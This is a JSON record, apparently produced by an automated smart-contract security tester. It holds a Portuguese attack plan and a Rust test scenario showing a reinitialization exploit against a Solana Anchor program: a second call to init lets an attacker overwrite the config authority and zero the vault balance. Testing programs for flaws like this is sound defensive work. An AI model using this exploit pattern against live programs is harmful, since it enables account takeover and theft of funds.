{"plan": "Preparo uma conta Config ja inicializada com authority legitima e vault_balance nao-zero, usando a propria instrucao init como baseline (que deve ter sucesso). Em seguida, o ataque chama init novamente passando a mesma conta config e um novo authority (atacante) como signer. O efeito medido e que config.authority passa a ser a chave do atacante e vault_balance e zerado, demonstrando a sobrescrita de estado (REINIT).", "scenario": "let legit_authority = Pubkey::new_unique();
let attacker = Pubkey::new_unique();

let config_key = Pubkey::new_unique();

// Baseline: inicializa a conta config legitimamente.
let ix_baseline = env.anchor_ix("init", &(), vec![
    AccountMeta::new(config_key, true),
    AccountMeta::new_readonly(legit_authority, true),
]);
let contas_baseline = vec![
    (config_key, empty_account()),
    (legit_authority, wallet(1_000_000_000)),
];
let r_base = env.baseline("init legitimo", &ix_baseline, &contas_baseline);

// Recupera o estado resultante do baseline para o ataque.
let config_pos = r_base.resulting_accounts.iter()
    .find(|(k, _)| *k == config_key)
    .map(|(_, a)| a.clone())
    .unwrap_or_else(|| account(&env.program_id, &anchor_account_data("Config", &(legit_authority, true, 500u64)), None));

// Ataque: chama init novamente sobre a conta ja inicializada, com novo authority.
let ix_attack = env.anchor_ix("init", &(), vec![
    AccountMeta::new(config_key, true),
    AccountMeta::new_readonly(attacker, true),
]);
let contas_attack = vec![
    (config_key, config_pos),
    (attacker, wallet(1_000_000_000)),
];
let r = env.attack("reinit sobrescreve authority", &ix_attack, &contas_attack);

if r.program_result == ProgramResult::Success {
    let data = after(&r, &config_key).data();
    let nova_authority = read_pubkey(data, 8);
    let novo_balance = read_u64(data, 8 + 32 + 1);
    env.effect("authority sobrescrita pelo atacante", nova_authority == attacker);
    env.effect("vault_balance zerado", novo_balance == 0);
}"}

